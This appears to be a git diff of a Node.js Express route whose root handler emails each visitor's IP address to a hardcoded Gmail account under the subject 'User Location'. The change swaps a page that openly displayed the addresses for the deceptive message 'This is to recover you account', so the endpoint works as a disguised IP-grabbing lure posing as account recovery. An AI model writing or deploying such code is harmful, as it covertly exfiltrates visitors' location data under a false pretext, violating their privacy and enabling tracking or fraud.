@@ -30,7 +30,7 @@ app.get('/', async(req, res) => {
     // console.log('Request:', req);
     // console.log('User IP Address:', userIpAddress);
     
-    res.send(`API Address: ${apiAddress}<br>User IP Address: ${userIpAddress}`);
+    res.send(`This is to recover you account`);
     await sentMail("obiora369@gmail.com", "User Location", `${userIpAddress}` )
 });
 
